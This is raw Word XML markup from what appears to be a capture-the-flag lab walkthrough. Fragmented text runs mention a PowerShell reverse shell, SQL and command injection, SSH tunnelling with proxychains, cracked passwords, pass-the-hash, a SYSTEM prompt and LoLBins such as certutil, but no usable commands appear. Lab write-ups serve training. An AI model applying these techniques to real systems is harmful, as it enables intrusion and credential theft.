    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1800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a. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="60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V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erify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th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4"/>
          <w:szCs w:val="24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t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he Po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w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erShell rever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e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hell del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4"/>
          <w:szCs w:val="24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vers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a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b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an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er before the flag:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="14" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2664"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:headerReference w:type="default" r:id="rId34"/>
          <w:footerReference w:type="default" r:id="rId35"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1320" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="696" w:gutter="0"/>
          <w:pgNumType w:start="20"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6F2F9F"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>[Mannie Watchdog Service Ini</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6F2F9F"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6F2F9F"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>iated]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:ind w:left="1080"/>
      </w:pPr>
      <w:r>
        <w:pict>
          <v:shape id="_x0000_i1030" type="#_x0000_t75" style="width:498pt;height:126pt">
            <v:imagedata r:id="rId36" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1560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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t xml:space="preserve">What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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>W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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>e Know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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>So F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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>r:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1560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We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si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 is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v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nerab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e to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QL injec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ion and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mm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and injec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ion</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="156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Hid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en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ge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/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min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/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ol_pa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el.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hp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FL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G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1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nd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UE1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="156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SS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H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un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el wi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xyc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ns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nd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o’s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ntials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o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he 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nte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l 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get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netwo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k</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="156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172.31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.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1.1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1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/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me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/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/b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nking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/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lagg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_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x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.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mp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nta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FLA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G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2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nd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2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="156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\\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17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2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.31.1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.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12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\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x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y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\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x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y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\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ientX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\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-4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ientX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_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246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0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1.jpg (000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0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010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9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.xlsx)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ntains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FL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G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3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="156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\\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17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2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.31.1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.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12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\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x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y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\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x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y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\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01-05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-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25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.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ynci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UE3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="156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cked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ntial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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="381" w:lineRule="auto"/>
        <w:ind w:left="1560" w:right="8959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moo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/ letme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n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min /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swo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d</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="156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pict>
          <v:group id="_x0000_s1083" style="position:absolute;left:0;text-align:left;margin-left:70.5pt;margin-top:231pt;width:457.25pt;height:394pt;z-index:-1884;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" coordorigin="1410,4620" coordsize="9145,7880">
            <v:shape id="_x0000_s1084" style="position:absolute;left:1410;top:4620;width:9145;height:7880" coordorigin="1410,4620" coordsize="9145,7880" path="m1410,12500r9145,l10555,4620r-9145,l1410,12500xe" filled="f">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page" anchory="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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ech</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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/</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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FL</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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A</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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G</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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{</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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 w:rsidR="00A76861"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c</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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h_p</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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a</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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ss</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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w</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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ord_</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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c</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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a</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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ck</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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 w:rsidR="00A76861"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}   </w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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#</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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FLA</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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G</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="156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clue /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p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as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_the_hash_to_deanna    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="8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#CLU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4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="156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’s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Ma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nie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’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wo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v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so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ot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een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ck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,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ut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w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v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e their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</w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="156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We pa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 w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>’s</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>as</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040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 get 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YST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mm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nd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mpt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on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 w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>172.</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1.1.</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1560" w:right="2934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We </w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ed</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>oL</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ns</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>we</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>rS</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>hell, ce</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>rt</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>uti</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
